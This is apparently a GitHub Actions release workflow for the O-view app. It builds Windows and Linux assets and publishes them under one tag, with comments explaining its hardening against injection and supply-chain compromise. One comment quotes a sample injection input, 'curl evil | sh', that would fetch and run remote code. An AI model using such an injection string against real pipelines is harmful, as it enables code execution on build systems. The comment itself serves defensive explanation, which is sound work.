# Cuts a release: one tag, every platform's assets.
#
# UNIFIED RELEASES (ADR-0009, decided 2026-08-02). Every tag carries both platforms'
# assets, whether or not that platform's code changed. This is what makes the update path
# correct by construction: there is always an asset for the checking platform, so
# `releases/latest` stays the right thing for the app to read. The cost is cosmetic — a
# Linux-only fix prompts Windows users to reinstall an identical binary.
#
# The alternative, publishing only the changed platform, would silently stall every Windows
# install the first time a Linux-only release went out, because `releases/latest` returns
# one release regardless of what is attached to it. See #79 and #81.
name: Release

on:
  push:
    tags: ["v*"]
  # Dry run: builds and verifies every artifact without creating a release, so the pipeline
  # can be exercised before a real tag depends on it.
  workflow_dispatch:
    inputs:
      version:
        description: "Version to build (dry run — no release is created)"
        required: true
        default: "0.6.0-dry"

# Read by default; only the job that actually publishes gets write. The build jobs run
# third-party code — `choco install` fetches a community package, and the Linux job runs a
# shell script from the checkout — and there is no reason any of that should hold a token
# that can create a release. Scoping it here means a compromise in a build step breaks the
# build instead of publishing an asset the auto-updater would then install.
permissions:
  contents: read

jobs:
  # One gate, not one per matrix leg.
  test:
    runs-on: windows-latest
    steps:
      # Pinned to SHAs — see the note in ci.yml.
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6.0.0
        with:
          dotnet-version: "10.0.x"
      - run: dotnet test -c Release

  version:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.v.outputs.version }}
      is_tag: ${{ steps.v.outputs.is_tag }}
    steps:
      # The dispatch input reaches the shell as an environment variable, never as text
      # pasted into the script. An inline expression is substituted before bash parses the
      # line, so an input of `1.0.0"; curl evil | sh; echo "` would have run as a command,
      # and an input containing a newline would have appended its own lines to
      # $GITHUB_OUTPUT — forging `is_tag=true` and turning an advertised dry run into a
      # real published release.
      #
      # The shape check is the second half of that: it is what actually guarantees the
      # value is a version and not a payload, and it fails the run loudly rather than
      # building something misnamed. It also keeps the asset names the app matches on
      # (ReleaseAssets) to the shape they are asserted against further down.
      - id: v
        env:
          INPUT_VERSION: ${{ github.event.inputs.version }}
        run: |
          set -euo pipefail
          if [ "$GITHUB_EVENT_NAME" = "push" ]; then
            VERSION="${GITHUB_REF_NAME#v}"
            IS_TAG=true
          else
            VERSION="$INPUT_VERSION"
            IS_TAG=false
          fi

          if ! printf '%s' "$VERSION" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$'; then
            echo "refusing to build '$VERSION': expected N.N.N with an optional -suffix" >&2
            exit 1
          fi

          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
          echo "is_tag=$IS_TAG" >> "$GITHUB_OUTPUT"

  windows:
    needs: [test, version]
    runs-on: windows-latest
    env:
      VERSION: ${{ needs.version.outputs.version }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6.0.0
        with:
          dotnet-version: "10.0.x"

      - name: Publish single-file self-contained exe
        run: >
          dotnet publish src/O-view.Tray -c Release -r win-x64 --self-contained
          -p:PublishSingleFile=true
          -p:Version=$env:VERSION
          -o publish

      # Pinned and checksum-verified. This step runs before ISCC builds the installer that
      # every Windows user auto-installs, so anything it executes is upstream of the
      # shipped binary: a republished or compromised community package would be running
      # inside the job that produces O-view-Setup.exe. Bumping this is a deliberate act.
      - name: Install Inno Setup
        run: choco install innosetup --version 6.7.1 --require-checksums --no-progress -y

      - name: Build installer
        shell: pwsh
        run: |
          $iscc = "${env:ProgramFiles(x86)}\Inno Setup 6\ISCC.exe"
          & $iscc "/DAppVersion=$env:VERSION" installer\O-view.iss
          if ($LASTEXITCODE -ne 0) { throw "ISCC failed with exit code $LASTEXITCODE" }

      # These two names are FROZEN. Every installed Windows build looks for the literal
      # string "O-view-Setup.exe"; renaming it strands existing users on their current
      # version with no way to be told (ReleaseAssets.WindowsInstallerName).
      - name: Stage assets
        shell: pwsh
        run: |
          New-Item -ItemType Directory -Force dist | Out-Null
          Copy-Item installer\O-view-Setup.exe dist\O-view-Setup.exe
          Copy-Item publish\O-view.Tray.exe dist\O-view.Tray.exe

      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: assets-windows
          path: dist/*

  linux:
    needs: [test, version]
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        rid: [linux-x64, linux-arm64]
    env:
      VERSION: ${{ needs.version.outputs.version }}
      RID: ${{ matrix.rid }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6.0.0
        with:
          dotnet-version: "10.0.x"

      # The same script the packaging workflow verifies, so what was proven to install is
      # what ships. Asset names come from it: o-view_<version>_<arch>.deb and
      # o-view-<version>-<rid>.tar.gz, matched by ReleaseAssets.DebianPackage / .Tarball.
      - name: Build packages
        run: |
          chmod +x packaging/linux/build.sh
          ./packaging/linux/build.sh "$VERSION" "$RID" dist

      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: assets-${{ matrix.rid }}
          path: dist/*

  release:
    # Every build job must succeed. A partial release is worse than no release: it would
    # publish a tag some platform has no asset for, which is exactly the state unified
    # releases exist to prevent.
    needs: [version, windows, linux]
    runs-on: ubuntu-latest
    # The only job that publishes, and so the only one that needs to be able to.
    permissions:
      contents: write
    env:
      VERSION: ${{ needs.version.outputs.version }}
      TAG: ${{ github.ref_name }}
    steps:
      # Only for the release-notes header. Everything shipped comes from the artifacts.
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          sparse-checkout: .github/release-notes-header.md
          sparse-checkout-cone-mode: false

      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
        with:
          path: staged
          merge-multiple: true

      # The workflow writes these names and the app matches them (ReleaseAssets). That is
      # one decision in two places, so it is asserted rather than assumed — a rename on
      # either side otherwise shows up as an app that quietly stops updating.
      - name: Every expected asset is present
        run: |
          V="$VERSION"
          expected=(
            "O-view-Setup.exe"
            "O-view.Tray.exe"
            "o-view_${V}_amd64.deb"
            "o-view_${V}_arm64.deb"
            "o-view-${V}-linux-x64.tar.gz"
            "o-view-${V}-linux-arm64.tar.gz"
          )
          ls -la staged
          missing=0
          for name in "${expected[@]}"; do
            if [ -f "staged/$name" ]; then
              echo "ok       $name"
            else
              echo "MISSING  $name"; missing=1
            fi
          done
          [ "$missing" -eq 0 ] || { echo "asset names do not match what the app looks for"; exit 1; }

      # Auto-generated notes are a list of merged PRs. They never say which of six assets a
      # given user wants, that GNOME needs an extension before the icon can appear, or that
      # Linux updates come from apt rather than from inside the app — and those are the three
      # things a first-time Linux user most needs (#84). So the evergreen header is
      # prepended to the generated section rather than replacing it.
      # $TAG and $GITHUB_REPOSITORY below are environment variables rather than inline
      # expression expansions, for the same reason as the version input: a git tag may
      # legally contain ';', '$', '&' and parentheses, so a crafted tag name substituted
      # into this script would run as a command in the one job that holds contents: write.
      #
      # That explanation lives HERE, in a YAML comment, and not inside the run: block below.
      # A run: block is a YAML block scalar — every line of it is part of the script string,
      # including the ones beginning with '#', and Actions evaluates expression syntax across
      # the whole value before bash ever sees it. Writing the two-brace token inside the block
      # to talk *about* it therefore fails the workflow to parse with "an expression was
      # expected", because an empty expression is not one. A YAML comment is stripped by the
      # parser and can say anything.
      - name: Compose release notes
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail

          # The header opens with an HTML comment explaining the file to maintainers. It is
          # invisible in rendered markdown, but it still ships inside the release body, where
          # it is noise for anyone reading the raw notes or consuming them through the API.
          # Strip it rather than moving the explanation somewhere nobody editing the file
          # would see it.
          sed '/^<!--$/,/^-->$/d' .github/release-notes-header.md > notes.md

          # Generated separately rather than via --generate-notes, so it lands BELOW the
          # header instead of replacing the body. See the note above this step for why the
          # tag arrives as $TAG.
          gh api "repos/${GITHUB_REPOSITORY}/releases/generate-notes" \
            -f tag_name="$TAG" \
            --jq .body >> notes.md || echo "_(no generated notes available)_" >> notes.md

          echo "--- composed release notes ---"
          cat notes.md

      - name: Dry run summary
        if: needs.version.outputs.is_tag != 'true'
        run: |
          echo "Dry run — every asset built and named correctly. No release created."
          echo "Tag the commit to publish."

      - name: Create release
        if: needs.version.outputs.is_tag == 'true'
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          gh release create "$TAG" staged/* \
            --repo "$GITHUB_REPOSITORY" \
            --title "O-view $TAG" \
            --notes-file notes.md
